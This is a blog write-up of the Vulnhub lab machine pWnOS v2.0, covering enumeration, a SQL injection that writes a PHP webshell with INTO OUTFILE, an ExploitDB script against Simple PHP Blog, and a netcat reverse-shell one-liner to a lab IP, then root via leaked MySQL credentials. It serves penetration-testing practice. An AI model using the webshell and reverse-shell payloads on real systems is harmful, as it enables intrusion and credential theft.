@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title> pWnOS v2.0 Write-Up —  &raquo;  Barvent</title>
+<meta name="description" content="Barvent's technology blog
+">
+<meta name="keywords" content="">
+<link rel="canonical" href="http://localhost:4000/write-ups/pwnos-2-writeup/">
+        
+
+
+
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="pWnOS v2.0 Write-Up" />
+<meta name="twitter:description" content="Barvent's technology blog
+" />
+<meta name="twitter:image" content="http://localhost:4000" />
+
+<!-- Google plus -->
+<meta name="author" content="">
+<link rel="author" href="">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pWnOS v2.0 Write-Up">
+<meta property="og:description" content="Barvent's technology blog
+">
+<meta property="og:url" content="http://localhost:4000/write-ups/pwnos-2-writeup/">
+<meta property="og:site_name" content="Barvent">
+
+        <link href='https://fonts.googleapis.com/css?family=Inconsolata:400,700' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="/assets/vendor/normalize-css/normalize.css">
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="stylesheet" href="/assets/vendor/highlight/styles/solarized_dark.css">
+
+<link rel="stylesheet" href="/assets/vendor/font-awesome/css/font-awesome.css">
+
+    </head>
+
+    <body>
+        <div class="wrapper">
+            <header class="header">
+    <div class="navigation">
+        <a href="/" class="logo">Barvent</a>
+
+        <ul class="menu">
+            <li class="menu__entry"><a href="/about">About</a></li>
+            <li class="menu__entry"><a href="/">Blog</a></li>
+            <li class="menu__entry"><a href="/categories">Categories</a></li>
+        </ul>
+    </div>
+
+    <ul class="social-links">
+        
+
+        
+    </ul>
+</header>
+
+            <h1 class="page-title post-title">
+    <div class="page-title__text post-title__text">pWnOS v2.0 Write-Up</div>
+    <div class="page-title__subtitle post-title__subtitle"></div>
+</h1>
+
+<div class="content">
+    <p>pWnOS is another OSCP-like machine from Vulnhub which has multiple ways to be solved.</p>
+<h1>Port Scan</h1>
+<p>This machine uses an static IP address (10.10.10.100), so we can skip the network scan.
+<img src="portScan.png" alt="Port Scan" />
+There are only two ports open, one for SSH and the other one for HTTP (which is the most interesting).
+<br /><br /></p>
+<h1>Port 80 Enumeration</h1>
+<p>The root page is an internal website with both a register and a login form. I registered into the website while Gobuster and SQLMap were running but I couldn’t get anything interesting from this. Gobuster found a directory called blog and SQLMap found that the login form was injectable.
+<img src="rootPage.png" alt="Root page" />
+<img src="gobuster.png" alt="Gobuster output" />
+<img src="sqlInjection.png" alt="SQLInjection" />
+From here there are two methods that can be followed to get a shell into the machine.
+<br /><br /></p>
+<h1>Method 1 (SQL Injection)</h1>
+<p>Using the SQL Injection we can leak the hash of the password of the administrator, but it isn’t used for anything. I decided to do the SQL Injection methods manually after using SQLMap to try to learn more about them. First, I attempted to leak information using an “UNION SELECT” in the query with 8 columns. The fourth column was displayed in the login page, so I could change it to any column in any table to leak it.
+<img src="sqlLeak.png" alt="Leaking info" />
+I added a “INTO OUTFILE ‘/var/www/shell.php’” to the previous query to try to upload a shell to the machine. The query ended up being:</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">email</span><span class="o">=</span><span class="s1">''</span> 
+<span class="k">UNION</span> 
+<span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="s1">'&lt;?php system($_REQUEST["cmd"]); ?&gt;'</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span> 
+<span class="k">FROM</span> <span class="n">USERS</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="err">‘</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="err">’</span><span class="o">#</span></code></pre></figure>
+
+<p><img src="sqlUpload.png" alt="Uploading shell" />
+<img src="sqlShell.png" alt="SQL Shell" /></p>
+<h1>Method 2 (Exploiting Simple PHP Blog)</h1>
+<p>In the blog directory there is a blog that uses “Simple PHP Blog” version 0.4.0 (as seen in the page meta data). This version of Simple PHP has multiple vulnerabilities and I used a perl script from ExploitDB to exploit them.
+<img src="blogSource.png" alt="Blog source" />
+<img src="exploitDB.png" alt="Exploits" />
+<img src="exploitScriptOut.png" alt="Exploit Script" />
+<img src="webshell.png" alt="Webshell" /></p>
+<h1>www-data Shell and PrivEsc</h1>
+<p>We can use a reverse shell from any of the two webshells that we uploaded to get a more interactive shell. To do so I used this one liner from the Pentest Monkey Cheatsheet:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 1234 <span class="o">&gt;</span>/tmp/f </code></pre></figure>
+
+<p><img src="reverseShell.png" alt="Reverse shell" />
+The first thing I did was checking the configuration files to get the user and the password of the MySQL account. I found two files with credentials, one at /var/mysqli_connect.php and the other one at /var/www/mysqli_connect.php. 
+<img src="credentials1.png" alt="Credentials 1" />
+<img src="credentials2.png" alt="Credentials 2" />
+The second credentials were wrong, but the ones in the first one could also be used to get root in the machine.
+<img src="root.png" alt="Root" /></p>
+<h1>Investigating other methods</h1>
+<p>The kernel version of the server is 2.6.38, which is really old. I tried using some kernel exploits but I couldn’t get them to work (probably because Dirty COW relies on a race condition but the machine only had one CPU).
+<img src="kernel.png" alt="Kernel Version" />
+The other thing that caught my attention was the fact that the mysql user had UID of 0 and that the MySQL server was running as root, which means that we can write files on the machine with root privileges.
+<img src="mysqld-root.png" alt="MySQLd root" />
+<img src="writing-files.png" alt="Writing files" />
+I spent a lot of time with this, but I couldn’t get anything. I tried writing an authorized_keys files but I wasn’t able to create a .ssh folder anywhere. I also tried to get code execution using the /etc/cron.d directory, but for reasons I don’t understand the cronfiles didn’t want to run (I did the same on my machine and it worked).
+<br /><br /></p>
+<h1>Conclusions</h1>
+<p>This is a really easy machine which can be completed pretty fast, so I used it to learn more about SQL Injection and Linux privilege escalation.</p>
+
+</div>
+
+<div class="about">
+    <div class="about__devider">*****</div>
+    <div class="about__text">
+        Written by <strong>  Barvent </strong>
+        on <strong>24 August 2020</strong>
+    </div>
+</div>
+
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'barvent-github-io';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+        </div>
+
+        <script src="/assets/vendor/highlight/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+        
+    </body>
+</html>
